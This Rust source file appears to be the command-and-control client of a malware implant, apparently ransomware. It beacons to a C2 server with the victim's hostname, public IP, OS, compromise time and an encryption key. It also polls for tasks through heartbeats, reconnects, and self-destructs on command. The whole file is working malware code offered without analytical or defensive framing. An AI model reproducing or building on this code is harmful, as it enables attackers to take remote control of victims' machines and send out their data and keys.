use tokio::net::TcpStream;
use tokio_util::codec::{FramedRead, FramedWrite};
use futures::{SinkExt, StreamExt};
use std::time::Duration;
use gethostname::gethostname;
use public_ip;
use local_ip_address::local_ip;

use crate::communication::codec::JsonCodec;
use crate::communication::message::{AgentMessage, ServerMessage};
use crate::post::commands::AgentCommand;
use crate::utils::logger::Logger;


/// Attempts to establish a TCP connection to the specified address asynchronously,
/// returning a `TcpStream` on success. If the connection fails, returns an error
/// with a formatted message describing the failure reason.
async fn send_message(addr: &str, message: AgentMessage, timeout_secs: u64) -> Result<Option<ServerMessage>, String> {
    println!("[*] Connecting to {}", addr);

    
    let stream = TcpStream::connect(addr).await.map_err(|e| format!("Connect failed: {}", e))?;
    let (read_half, write_half) = stream.into_split();
    let mut framed_rx = FramedRead::new(read_half, JsonCodec::<ServerMessage>::new());
    let mut framed_tx = FramedWrite::new(write_half, JsonCodec::<AgentMessage>::new());

    println!("[*] Sending message: {:?}", message);
    
    framed_tx.send(message).await.map_err(|e| format!("Send failed: {}", e))?;


    match tokio::time::timeout(Duration::from_secs(timeout_secs), framed_rx.next()).await {
        Ok(Some(Ok(msg))) => Ok(Some(msg)),
        Ok(Some(Err(e))) => Err(format!("Receive error: {:?}", e)),
        Ok(None) => Err("Connection closed by server".into()),
        Err(_) => Err("Timeout waiting for response".into()),
    }

}

/// Beacon C2 and send victim info and encrypted key to C2
pub async fn initial_beacon(addr: &str, retries: u64, timeout: u64, logger: &Logger, key: &Vec<u8>) -> (u64, String) {
    let beacon = match get_info(key).await {
        Ok(beacon) => beacon,
        Err(e) => {
            logger.error(&format!("[-] Failed to get host info: {:?}", e));
            return (0, "NONE".to_string());
        }
    };

    for attempt in 1..=retries {
        println!("[*] Attempting beacon (attempt {}/{})", attempt, retries);
        match send_message(addr, beacon.clone(), timeout).await {
            Ok(Some(ServerMessage::Ack {
                agent_id,
                status,
                session_id,
            })) => {
                logger.log(&format!("[*] Received Ack from server (status: {})", status));
                return (agent_id, session_id);
            }
            Ok(Some(msg)) => {
                logger.error(&format!("[!] Unexpected message: {:?}", msg));
                return (0, "NONE".to_string());
            }
            Err(e) => {
                logger.error(&format!("[!] Beacon attempt failed: {}", e));
            }
            _ => {}
        }
    }

    logger.log(&format!("[!] No Ack received after {} attempts. Operating offline.", retries));
    (0, "NONE".to_string())
}

pub async fn heartbeat(
    addr: &str, 
    agent_id: u64, 
    session_id: &str, 
    timeout_secs: u64, 
    result: Option<Vec<String>>,
    logger: &Logger) -> Option<Vec<AgentCommand>> {
    let heartbeat = AgentMessage::Heartbeat { 
        agent_id, 
        session_id: session_id.to_string(), 
        result 
    };

    match send_message(addr, heartbeat, timeout_secs).await {
        Ok(Some(ServerMessage::Noop { 
            agent_id: _, 
            session_id: _ 
        })) => {
            logger.log("[*] Received NOOP from C2");
            return Some(vec![AgentCommand::NOOP])
        }
        Ok(Some(ServerMessage::Task { 
            agent_id: _, 
            session_id: _, 
            command 
        })) => {
            logger.log("[*] Received tasks from C2");
            return Some(command)
        }
        Ok(Some(ServerMessage::Disconnect { 
            agent_id:_, 
            session_id:_ 
        })) => {
            logger.log("[*] Received disconnect from C2");
            return Some(vec![AgentCommand::SelfDestruct])
        }
        Ok(Some(msg)) => {
            logger.error(&format!("[!] Unexpected message: {:?}", msg));
            return Some(vec![AgentCommand::InvalidTask])
        }
        Err(e) => {
            logger.error(&format!("[!] Beacon attempt failed: {}", e));
        }
        _ => {}
    }

    return None
}

pub async fn reconnect(addr: &str, agent_id: u64, session_id: &str, timeout: u64, logger: &Logger) -> (u64, String) {
    let reconnect = AgentMessage::Reconnect {
        agent_id,
        session_id: session_id.to_string()
      };

    match send_message(addr, reconnect.clone(), timeout).await {
        Ok(Some(ServerMessage::Ack {
            agent_id,
            status,
            session_id,
        })) => {
            logger.log(&format!("[*] Received Ack from server (status: {})", status));
            return (agent_id, session_id);
        }
        Ok(Some(msg)) => {
            logger.error(&format!("[!] Unexpected message: {:?}", msg));
            return (0, "NONE".to_string());
        }
        Err(e) => {
            logger.error(&format!("[!] Reconnect attempt failed: {}", e));
        }
        _ => {}
    }


    logger.error("[!] Failed to reconnect. Continuing to operate offline.");
    (0, "NONE".to_string())
}

/// Constructs an `AgentMessage::Beacon` variant containing information about the compromised system,
    /// including the hostname, public IP address, operating system, and the current timestamp in RFC 3339 format.
    /// 
    /// # Fields
    /// - `hostname`: The system's hostname as a `String`.
    /// - `ip`: The public IP address of the system.
    /// - `os`: The operating system as a `String`.
    /// - `time_compromised`: The timestamp when the system was compromised, formatted as an RFC 3339 string.
pub async fn get_info(key: &Vec<u8>) -> Result<AgentMessage, Box<dyn std::error::Error>> {
    let hostname = gethostname();
    let local_ip = local_ip()?;
    let os = std::env::consts::OS;

    let public_ip = if let Some(ip) = public_ip::addr().await {
        ip.to_string()
    } else { local_ip.to_string() };

    let message = AgentMessage::Beacon { 
        hostname: hostname.to_string_lossy().to_string(), 
        ip: public_ip, 
        os: os.to_string(), 
        time_compromised: chrono::Utc::now().to_rfc3339(),
        key: key.to_vec()
    };

    Ok(message)
}